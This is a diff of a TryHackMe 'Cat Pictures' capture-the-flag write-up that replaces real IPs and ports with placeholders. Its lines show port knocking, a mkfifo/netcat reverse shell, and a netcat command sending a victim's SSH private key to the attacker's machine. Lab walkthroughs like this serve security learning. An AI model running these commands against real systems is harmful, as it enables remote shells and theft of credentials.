@@ -4,7 +4,7 @@
 
 First I checked the connection with a ping to the machine
 
-![Ping](Writeups/THM/Cat_Pictures/Img/Ping.png)
+![Ping](Img/Ping.png)
 
 Based on the ttl we know is a linux machine, nos I scan the ports and services of the machine with nmap.
 
@@ -45,7 +45,7 @@ In this post knock knock makes reference to port knocking, port knocking is a te
 Searching for information I found a python script in this [repository](https://github.com/eliemoutran/KnockIt) and i executed it like this:
 
 ```bash
-python3 knockit.py -b 10.66.164.145 1111 2222 3333 4444
+python3 knockit.py -b <IP> 1111 2222 3333 4444
 ```
 
 After I executed the exploit I have done another nmap scan, that scan reveled me that there is a FTP service running.
@@ -65,7 +65,7 @@ nc -nv <IP> 4420
 I'm inside the machine, I saw that the machine have mkfifo and netcat so I made a reverse shell.
 
 ```bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.145.222 1234 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <IP> <PORT> >/tmp/f
 ```
 
 Now I'm not in a limited shell, I can move through the directories and  I can execute the runme script.
@@ -92,9 +92,9 @@ I send with netcat the private key to my machine.
 
 ```bash
 # nuestra maquina
-nc -lvnp 4444 > id_rsa
+nc -lvnp <PORT> > id_rsa
 # maquina victima
-nc <IP> 4444 < /home/catlover/id_rsa
+nc <IP> <PORT> < /home/catlover/id_rsa
 ```
 
 ### SSH
